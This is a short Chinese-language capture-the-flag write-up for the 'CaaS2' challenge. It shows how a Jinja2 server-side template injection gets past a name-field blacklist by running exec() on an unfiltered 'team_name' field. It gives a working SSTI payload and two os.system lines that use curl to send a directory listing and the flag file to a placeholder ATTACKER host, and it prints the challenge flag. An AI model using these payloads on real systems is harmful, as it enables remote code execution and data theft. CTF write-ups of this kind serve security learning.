# CaaS2

## 题目简述

第二版扩大了 `name` 黑名单，却仍只检查该字段，且表单继续提交未过滤的 `team_name`。同一条 70 字符 SSTI 跳板仍能执行第二字段中的任意 Python。

## 解题过程

`name` 继续使用：

```jinja2
{{request.application.__builtins__.exec(request.values["team_name"])}}
```

这条表达式不含新增黑名单中的空格、`f`、`d`、`k`、`h` 等字符，而 `team_name` 没有经过 `blacklist`。先枚举工作目录并外带结果：

```python
import os;os.system("ls > /tmp/list;curl https://ATTACKER/ -d @/tmp/list")
```

列表显示随机化文件名 `s3cur3_fl4g_f1l3_.txt`，再提交：

```python
import os;os.system("curl https://ATTACKER/ -d @s3cur3_fl4g_f1l3_.txt")
```

收到：

```text
n00bz{g00d_j0b_0n_s0lv1ng_C44S_2_n0w_y0u_c4n_t4k3_r3s7!!!!!}
```

## 方法总结

黑名单变长没有改变信任边界，未检查的旁路字段仍可承载完整载荷。随机 flag 文件名只增加一次目录枚举，不能阻止已获得命令执行的攻击者。
